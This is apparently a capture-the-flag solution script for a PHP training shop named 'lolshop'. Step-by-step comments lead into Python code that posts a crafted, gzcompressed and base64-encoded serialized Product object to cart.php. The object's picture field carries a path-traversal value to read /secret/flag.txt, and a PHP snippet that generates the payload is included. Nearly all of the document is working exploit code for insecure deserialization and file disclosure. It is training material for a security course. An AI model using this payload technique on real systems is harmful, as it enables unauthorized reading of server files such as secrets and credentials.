#look for a function that print as a string the content of a file
#check the flow that leads to this function file_get_contents() -> getPicture() -> toDict()
#it is called in three pages to be precise: add_to_cart.php, cart.php and purchase.php
# cart.php is the one
#Use postman to send the php post request at the follwoing link: http://lolshop.training.jinblack.it/api/cart.php
#on postman changes body -> form-data -> add field "state" and add the encoded craft
#search ctrl+shift+f to search for unserialize

#Serialized Product class object
#O:7:"Product":5:{s:11:"Productid";i:1;s:13:"Productname";s:4:"name";s:20:"Productdescription";s:11:"description";s:16:"Productpicture";s:24:"../../../secret/flag.txt";s:14:"Productprice";i:10;}

#The object is encoded and decoded in base64 hence we need to convert it.

#flag is in /secret/flag.txt

import requests
import base64

#payload_string = 'O:7:"Product":5:{s:11:"Productid";i:1;s:13:"Productname";s:4:"name";s:20:"Productdescription";s:11:"description";s:16:"Productpicture";s:24:"../../../secret/flag.txt";s:14:"Productprice";i:10;}'

#serialized and compressed and econded object
payload = "eJzztzK3Ugooyk8pTS5RsjK1qi62MjS0UmKACjFkpihZZ1oZWgOFjZGE8xJzU5WAgiZWSjCmkQGSfEpqcXJRZkFJZn4eSA5kJLqQGZLygszkktIiiDFAI/X09CGoODW5KLVEPy0nMV2vpKIErM8EWV9RZnIq2IEG1rUAs3E+eA=="

URL = 'http://lolshop.training.jinblack.it'
URL_cartphp = "%s/api/cart.php" % URL

payload = {'state': payload}
r = requests.post(URL_cartphp, data=payload)

print(base64.b64decode(r.json()['picture']))

"""
class Product {
    private $id = 1;
    private $name = "name";
    private $description = "description";
    private $picture = "../../../secret/flag.txt";
    private $price = 10;
}

echo base64_encode(gzcompress(serialize(new Product))); //function to get the payload serialized and encoded

"""